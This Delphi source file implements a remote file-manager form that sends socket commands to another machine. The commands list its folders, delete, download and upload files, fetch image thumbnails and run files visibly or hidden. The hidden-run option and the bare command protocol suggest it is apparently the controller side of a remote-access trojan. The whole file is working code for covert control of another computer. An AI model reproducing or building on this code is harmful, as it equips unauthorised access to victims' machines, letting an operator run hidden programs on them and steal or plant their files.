unit uFilemanager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, StdCtrls, ComCtrls,WinSock, ImgList, Menus,
  ExtCtrls, Buttons, ShellAPI;

type
  TForm2 = class(TForm)
    cbb1: TComboBox;
    lbl1: TLabel;
    edt1: TEdit;
    lv1: TListView;
    stat1: TStatusBar;
    pm1: TPopupMenu;
    Download1: TMenuItem;
    Execute1: TMenuItem;
    Visible1: TMenuItem;
    Hidden1: TMenuItem;
    Delete1: TMenuItem;
    Upload1: TMenuItem;
    N1: TMenuItem;
    Refresh1: TMenuItem;
    dlgOpen1: TOpenDialog;
    pb1: TProgressBar;
    lbl2: TLabel;
    lbl3: TLabel;
    lbl4: TLabel;
    lbl5: TLabel;
    shp1: TShape;
    img1: TImage;
    N2: TMenuItem;
    ViewThumbnail1: TMenuItem;
    ImageList1: TImageList;
    BitBtn1: TBitBtn;
    procedure cbb1Change(Sender: TObject);
    procedure lv1DblClick(Sender: TObject);
    procedure Refresh1Click(Sender: TObject);
    procedure Delete1Click(Sender: TObject);
    procedure Visible1Click(Sender: TObject);
    procedure Hidden1Click(Sender: TObject);
    procedure Download1Click(Sender: TObject);
    procedure Upload1Click(Sender: TObject);
    procedure ViewThumbnail1Click(Sender: TObject);
    procedure lv1ContextPopup(Sender: TObject; MousePos: TPoint;
      var Handled: Boolean);
    procedure BitBtn1Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
    function GetFileIcon(FileName: String): Integer;
  end;
Function GetFileSize(FileName: String): Int64;

var
  Form2: TForm2;
  IconList : TStringList;
function ImageList_ReplaceIcon(ImageList: THandle; Index: Integer; Icon: hIcon): Integer; stdcall; external 'comctl32.dll' name 'ImageList_ReplaceIcon';

implementation

{$R *.dfm}
//fixed by Slayer616
function TForm2.GetFileIcon(FileName: String): Integer;
const
 OFFSET = 3;
var
 FileInfo: TSHFileInfo;
 Ext     : String;
begin
 Ext := Lowercase(ExtractFileExt(FileName));
 Result := IconList.IndexOf(Ext) + (OFFSET);
 if Result = (OFFSET - 1) then
  begin
   SHGetFileInfo(PChar(Ext), 0, FileInfo, SizeOf(FileInfo), SHGFI_ICON or SHGFI_USEFILEATTRIBUTES or SHGFI_SMALLICON);
   Result := ImageList_ReplaceIcon(ImageList1.Handle, -1, FileInfo.hIcon);
   DestroyIcon(FileInfo.hIcon);
   IconList.Add(Ext);
  end;
end;

procedure TForm2.BitBtn1Click(Sender: TObject);
var
data:string;
sock:integer;
begin
      if Length(edt1.text) = 3 then exit;
      Lv1.Clear;
      Data := ExtractFilePath(Copy(Edt1.Text, 1, Length(Edt1.Text)-1));
      edt1.Text := Data;
      Data := '11|'+Data+#10;
      Sock := StrToInt(Stat1.Panels[0].Text);
      If (Sock > 0) Then
        Send(Sock, Data[1], Length(Data), 0);
end;

procedure TForm2.cbb1Change(Sender: TObject);
var
Data:string;
sock:integer;
begin
  Lv1.Clear;
  Data := '11|'+Cbb1.Text+#10;
  Sock := StrToInt(Stat1.Panels[0].Text);
  If (Sock > 0) Then
    Send(Sock, Data[1], Length(Data), 0);
  edt1.Text := Cbb1.Text;
end;

procedure TForm2.lv1DblClick(Sender: TObject);
var
Data:string;
sock:integer;
begin
Sock := StrToInt(Stat1.Panels[0].Text);
  if lv1.Selected = nil then Exit;
    If (lv1.selected.SubItems[0] = 'DIR') Then
    Begin
      Data := '11|'+Edt1.Text+Lv1.selected.Caption+#10;
      edt1.Text := edt1.Text + Lv1.selected.Caption + '\';
      Lv1.Clear;
      Sock := StrToInt(Stat1.Panels[0].Text);
      If (Sock > 0) Then
        Send(Sock, Data[1], Length(Data), 0);
    End Else begin
      If (Lv1.ItemFocused.Caption = '..') And
       (Lv1.ItemFocused.SubItems[0] = 'Go Back') Then
      Begin
      Lv1.Clear;
      Data := ExtractFilePath(Copy(Edt1.Text, 1, Length(Edt1.Text)-1));
      edt1.Text := Data;
      Data := '11|'+Data+#10;
      Sock := StrToInt(Stat1.Panels[0].Text);
      If (Sock > 0) Then
        Send(Sock, Data[1], Length(Data), 0);
      end;
    end;
end;

procedure TForm2.Refresh1Click(Sender: TObject);
var
Data:string;
sock:integer;
begin
  Lv1.Clear;
  Data := '11|'+Edt1.Text+#10;
  Sock := StrToInt(Stat1.Panels[0].Text);
  If (Sock > 0) Then
    Send(Sock, Data[1], Length(Data), 0);
end;

procedure TForm2.Delete1Click(Sender: TObject);
var
Data:string;
sock:integer;
i:integer;
label nextfile;
begin
for i := 0 to Lv1.items.Count - 1 do begin
  if lv1.Items.item[i].Selected  then begin

  If (Lv1.Items.Item[i].SubItems[0] = 'DIR') Then
  Begin
    MessageBox(0, 'You cant delete whole directories.', 'Error', mb_ok or mb_iconhand);
    goto nextfile;
  End;

  Sock := StrToInt(Stat1.Panels[0].Text);
  Data := '15|' + Edt1.Text + Lv1.items.Item[i].Caption +#10;
  If (Sock > 0) Then
    Send(Sock, Data[1], Length(Data), 0);
   nextfile:
  end;
end;
  Refresh1.Click;
end;

procedure TForm2.Visible1Click(Sender: TObject);
var
Data:string;
sock:integer;
i:integer;
label nextfile;
begin
for i := 0 to Lv1.items.Count - 1 do begin
  if lv1.Items.item[i].Selected  then begin
  If (Lv1.Items.Item[i].SubItems[0] = 'DIR') Then
  Begin
    MessageBox(0, 'You cant execute whole directories.', 'Error', mb_ok or mb_iconhand);
    goto nextfile;
  End;

  Sock := StrToInt(Stat1.Panels[0].Text);
  Data := '14|1|' + Edt1.Text + Lv1.items.Item[i].Caption +#10;
  If (Sock > 0) Then
    Send(Sock, Data[1], Length(Data), 0);
    nextfile:
  end;
end;
end;

procedure TForm2.Hidden1Click(Sender: TObject);
var
Data:string;
sock:integer;
i:integer;
label nextfile;
begin
for i := 0 to Lv1.items.Count - 1 do begin
  if lv1.Items.item[i].Selected  then begin
  If (Lv1.Items.Item[i].SubItems[0] = 'DIR') Then
  Begin
    MessageBox(0, 'You cant execute whole directories.', 'Error', mb_ok or mb_iconhand);
    goto nextfile;
  End;

  Sock := StrToInt(Stat1.Panels[0].Text);
  Data := '14|0|' + Edt1.Text + Lv1.items.Item[i].Caption +#10;
  If (Sock > 0) Then
    Send(Sock, Data[1], Length(Data), 0);
    nextfile:
  end;
end;
end;

procedure TForm2.Download1Click(Sender: TObject);
var
Data:string;
sock:integer;
i:integer;
label nextfile;
begin
//if lv1.Selected = nil then exit;
for i := 0 to Lv1.items.Count - 1 do begin
  if lv1.Items.Item[i].Selected then begin
    If (lv1.Items.Item[i].SubItems[0] = 'DIR') Then
    Begin
      MessageBox(0, 'You cant download whole directories.', 'Error', mb_ok or mb_iconhand);
      goto nextfile;
    End;
    Sock := StrToInt(Stat1.Panels[0].Text);
    Data := '25|' + Edt1.Text + Lv1.Items.Item[i].Caption +#10;
    If (Sock > 0) Then begin
      Send(Sock, Data[1], Length(Data), 0);
      sleep(50);
      application.processmessages;
    end;
    nextfile:
  end;
end;

end;
Function GetFileSize(FileName: String): Int64;
Var
  H     :THandle;
  Data  :TWIN32FindData;
Begin
  Result := -1;
  H := FindFirstFile(pChar(FileName), Data);
  If (H <> INVALID_HANDLE_VALUE) Then
  Begin
    Windows.FindClose(H);
    Result := Int64(Data.nFileSizeHigh) SHL 32 + Data.nFileSizeLow;
  End;
End;
procedure TForm2.Upload1Click(Sender: TObject);
var
Data:string;
sock:integer;
begin
Sock := StrToInt(Stat1.Panels[0].Text);
If dlgopen1.Execute Then
  Begin
    Data := IntToStr(40) + '|' +
            IntToStr(GetFileSize(dlgopen1.FileName)) + '|' +
            Edt1.Text + ExtractFileName(dlgopen1.FileName) + '|' +
            dlgopen1.FileName + #10;
    If (Sock > 0) Then
      Send(Sock, Data[1], Length(Data), 0);
  End;
end;

procedure TForm2.ViewThumbnail1Click(Sender: TObject);
var
Data:string;
sock:integer;
begin
if lv1.Selected = nil then exit;
If (Lv1.Selected .SubItems[1] = 'DIR') Then
Begin
  MessageBox(0, 'You cant download whole directories.', 'Error', mb_ok or mb_iconhand);
  Exit;
End;

Sock := StrToInt(Stat1.Panels[0].Text);
Data := '116|' + Edt1.Text + Lv1.selected.Caption  + '|' + Stat1.Panels[0].Text +#10;
If (Sock > 0) Then
  Send(Sock, Data[1], Length(Data), 0);
lbl5.Caption := Lv1.Selected.Caption;
end;

procedure TForm2.lv1ContextPopup(Sender: TObject; MousePos: TPoint;
  var Handled: Boolean);
begin
if lv1.Selected = nil then begin
pm1.Items.Items[6].Visible := false;
pm1.Items.Items[7].Visible := false;
exit;
end;
if (lv1.Selected.SubItems[1] <> 'DIR') then begin
  if (lowercase(copy(lv1.Selected.Caption,length(lv1.Selected.Caption) - 3,4)) = '.bmp') or (lowercase(copy(lv1.Selected.Caption,length(lv1.Selected.Caption) - 3,4)) = '.jpg') then begin
     pm1.Items.Items[6].Visible := true;
     pm1.Items.Items[7].Visible := true;
     exit;
  end;
end;
pm1.Items.Items[6].Visible := false;
pm1.Items.Items[7].Visible := false;
end;

end.
